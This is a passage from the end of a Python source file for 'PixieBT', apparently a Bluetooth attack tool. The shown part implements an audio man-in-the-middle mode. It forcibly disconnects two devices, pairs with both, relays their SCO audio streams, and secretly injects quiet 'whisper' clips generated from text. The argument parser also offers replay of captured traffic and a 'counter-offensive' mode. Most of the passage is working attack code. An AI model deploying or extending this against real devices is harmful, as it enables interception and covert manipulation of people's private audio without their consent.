            print(colored("[*] Total: {} whisper(s) played on {}".format(
                stats_inj["injections"], info_t["name"]), "cyan"))

        return

    # ─── Dual-target MITM mode ─────────────────
    if not iface2:
        print(colored("[!] MITM relay requires -o.", "red"))
        sys.exit(1)
    check_interface(iface2)

    mac_a, info_a = sorted_targets[indices[0]]
    mac_b, info_b = sorted_targets[indices[1]]

    print(colored("\n[*] Target A: {} ({})".format(mac_a, info_a["name"]), "yellow"))
    print(colored("[*] Target B: {} ({})".format(mac_b, info_b["name"]), "yellow"))
    print(colored("[*] Mode    : MITM relay", "yellow"))

    # Step 4: Get adapter MACs
    adapter1_mac = _get_controller_mac(iface)
    adapter2_mac = _get_controller_mac(iface2)
    if not adapter1_mac or not adapter2_mac:
        print(colored("[!] Cannot read adapter MAC addresses from sysfs.", "red"))
        sys.exit(1)

    # Step 5: Disconnect targets from each other
    print(colored("\n[*] Disconnecting targets ...", "cyan"))
    _disconnect_target(mac_a)
    _disconnect_target(mac_b)
    time.sleep(1)

    # Step 6: Pair with both targets
    print(colored("[*] Pairing with targets ...", "cyan"))
    if not _pair_device(mac_a):
        print(colored("[!] Cannot pair with device A. Aborting.", "red"))
        sys.exit(1)
    if not _pair_device(mac_b):
        print(colored("[!] Cannot pair with device B. Aborting.", "red"))
        sys.exit(1)
    time.sleep(1)

    # Step 7: Establish SCO connections
    print(colored("[*] Establishing SCO connections ...", "cyan"))
    sock_a = _sco_connect(adapter1_mac, mac_a)
    if not sock_a:
        sys.exit(1)
    print(colored("    [+] SCO → A: {} ({})".format(mac_a, info_a["name"]), "green"))

    sock_b = _sco_connect(adapter2_mac, mac_b)
    if not sock_b:
        sock_a.close()
        sys.exit(1)
    print(colored("    [+] SCO → B: {} ({})".format(mac_b, info_b["name"]), "green"))

    # Step 8: Start relay threads
    print(colored(
        "\n[+] MITM relay active — whispers injected on multi-source detection",
        "green", attrs=["bold"]))
    print(colored("[*] Press Ctrl+C to stop\n", "cyan"))

    stats_a2b = {"relayed": 0, "injections": 0, "stopped": False}
    stats_b2a = {"relayed": 0, "injections": 0, "stopped": False}

    t_a2b = threading.Thread(
        target=_relay_thread,
        args=(sock_a, sock_b, "A→B", whispers, stats_a2b),
        daemon=True,
    )
    t_b2a = threading.Thread(
        target=_relay_thread,
        args=(sock_b, sock_a, "B→A", whispers, stats_b2a),
        daemon=True,
    )
    t_a2b.start()
    t_b2a.start()

    # Step 9: Summary loop
    while not stop_event.is_set():
        time.sleep(10)
        if stop_event.is_set():
            break
        total_r = stats_a2b["relayed"] + stats_b2a["relayed"]
        total_i = stats_a2b["injections"] + stats_b2a["injections"]
        color = "green" if total_i == 0 else "magenta"
        print(colored(
            "[*] Relay: {} pkt(s) | Injections: {} | A→B: {}/{} | B→A: {}/{}".format(
                total_r, total_i,
                stats_a2b["relayed"], stats_a2b["injections"],
                stats_b2a["relayed"], stats_b2a["injections"]),
            color))
        if stats_a2b["stopped"] and stats_b2a["stopped"]:
            print(colored("[!] Both relay threads stopped.", "red"))
            break

    # Step 10: Cleanup
    stop_event.set()
    sock_a.close()
    sock_b.close()
    t_a2b.join(timeout=5)
    t_b2a.join(timeout=5)
    total_r = stats_a2b["relayed"] + stats_b2a["relayed"]
    total_i = stats_a2b["injections"] + stats_b2a["injections"]
    print(colored("[*] PixieBT mode 4 stopped.", "yellow"))
    print(colored("[*] Total: {} pkt(s) relayed, {} whisper injection(s)".format(
        total_r, total_i), "cyan"))


# ──────────────────────────────────────────────
#  Main
# ──────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        "PixieBT",
        description=DESCRIPTION,
        formatter_class=RawTextHelpFormatter,
    )
    parser.add_argument(
        "-m", "--mode",
        required=True,
        choices=["1", "2", "3", "4"],
        help="1 = Scan & whitelist  |  2 = Monitor & counter-offensive\n3 = Capture & replay  |  4 = Audio MITM (whisper injection)",
    )
    parser.add_argument(
        "-c", "--config",
        default=CONFIG_FILE,
        help="Path to config file (default: pixiebt.conf)",
    )
    parser.add_argument(
        "-t", "--scan-time",
        type=int,
        default=10,
        help="Scan duration in seconds (mode 1, default: 10)",
    )
    parser.add_argument(
        "-r", "--replay-count",
        type=int,
        default=10,
        help="Number of times to replay captured traffic (mode 3, default: 10)",
    )
    parser.add_argument(
        "--no-ble",
        action="store_true",
        help="Disable BLE scanning (classic BT only)",
    )
    parser.add_argument(
        "-o",
        dest="interface2",
        default=None,
        help="Second BT adapter for mode 4 MITM (e.g. hci1)",
    )
    parser.add_argument(
        "-w", "--whispers-dir",
        default=None,
        help="Directory containing .wav whisper files (mode 4)",
    )
    parser.add_argument(
        "-f",
        "--f",
        dest="whispers_text",
        default=None,
        help="Text file with words/phrases (one per line) to generate whisper WAVs via espeak (mode 4)",
    )
    parser.add_argument(
        "--whisper-volume",
        type=float,
        default=0.15,
        help="Whisper injection volume 0.0-1.0 (mode 4, default: 0.15)",
    )
    parser.add_argument(
        "-l", "--whisper-lang",
        default="en",
        help="Espeak language code for TTS generation (mode 4, default: en). Examples: fr, de, es, it, pt, ru, zh, ja",
    )

    args = parser.parse_args()
    print(colored(banner_intro, "cyan"))

    iface, conf_lang = load_config(args.config)
    check_interface(iface)

    mode = int(args.mode)
    include_ble = not args.no_ble

    # CLI --whisper-lang overrides config file; fallback to "en"
    whisper_lang = args.whisper_lang if args.whisper_lang != "en" else (conf_lang or "en")

    if mode == 1:
        mode_scan_whitelist(iface, scan_time=args.scan_time, include_ble=include_ble)
    elif mode == 2:
        mode_monitor(iface, include_ble=include_ble)
    elif mode == 3:
        mode_replay(iface, include_ble=include_ble, replay_count=args.replay_count)
    elif mode == 4:
        mode_whisper(iface, args.interface2, args.whispers_dir,
                     whisper_volume=args.whisper_volume, include_ble=include_ble,
                     whispers_text=args.whispers_text, whisper_lang=whisper_lang)
